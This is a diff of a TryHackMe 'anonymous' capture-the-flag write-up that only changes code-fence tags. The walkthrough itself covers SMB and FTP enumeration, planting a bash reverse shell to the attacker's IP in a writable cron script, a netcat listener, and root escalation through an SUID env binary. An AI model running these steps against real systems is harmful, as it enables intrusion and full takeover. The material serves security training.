@@ -3,7 +3,7 @@ This is a writeup for the TryHackMe room [anonymous](https://tryhackme.com/room/
 
 The questions ask about ports, so let's start with an nmap scan.
 
-```bash
+```zsh
 nmap -sV $ip
 ```
 
@@ -13,7 +13,7 @@ This nmap scan shows us that ports 21, 22, 139 and 445 are open. Port 21 is used
 
 Let's check for SMB shares.
 
-```bash
+```zsh
 smbmap -H $ip -R
 ```
 
@@ -21,7 +21,7 @@ smbmap -H $ip -R
 
 This shows us two files that we can download, corgo2.jpg and puppos.jpeg.
 
-```bash
+```zsh
 smbget -R smb://$ip/pics
 ```
 
@@ -39,7 +39,7 @@ These look like they're just pictures of dogs but let's exiftool them just in ca
 
 Nothing interesting there. SMB seems to be a dead end for now, let's check FTP.
 
-```bash
+```zsh
 ftp $ip
 ```
 
@@ -65,13 +65,13 @@ Back to that **clean.sh** file, maybe we can add to that file and see if anythin
 
 First we need to create a folder for the files to mount to.
 
-```bash
+```zsh
 mkdir ftp
 ```
 
 Then we run `curlftpfs`.
 
-```bash 
+```zsh 
 sudo curlftpfs anonymous@$ip ftp/
 ```
 
@@ -79,7 +79,7 @@ sudo curlftpfs anonymous@$ip ftp/
 
 Now we need to edit the **clean.sh** file, we can do that with any text editor but for now we'll just use `nano`.
 
-```sh
+```zsh
 sudo nano ftp/scripts/clean.sh
 ```
 
@@ -87,7 +87,7 @@ sudo nano ftp/scripts/clean.sh
 
 We're going to add a line to give us a reverse shell. Credit goes to the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) github repo for the reverse shell.
 
-```bash
+```zsh
 bash -i >& /dev/tcp/$yourip/4242 0>&1
 ```
 
@@ -95,7 +95,7 @@ bash -i >& /dev/tcp/$yourip/4242 0>&1
 
 Now we need to set up a netcat listener, we can use the following command for this.
 
-```sh
+```zsh
 nc -lnvp 4242
 ```
 
@@ -105,13 +105,13 @@ And now we wait...
 
 Once we have a reverse shell we can print out the user flag. We should probably stabilise our shell, we can do that with python.
 
-```sh
+```zsh
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 Now that that's done let's move on to priv-esc. First we'll check for **SUID** binaries.
 
-```sh
+```zsh
 find / -user root -perm -4000 -print 2>/dev/null
 ```
 
@@ -119,7 +119,7 @@ find / -user root -perm -4000 -print 2>/dev/null
 
 The only thing out of the ordinary there is `env`, so let's check [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) to see if they have any suggestions.
 
-```sh
+```zsh
 env /bin/sh -p
 ```
 
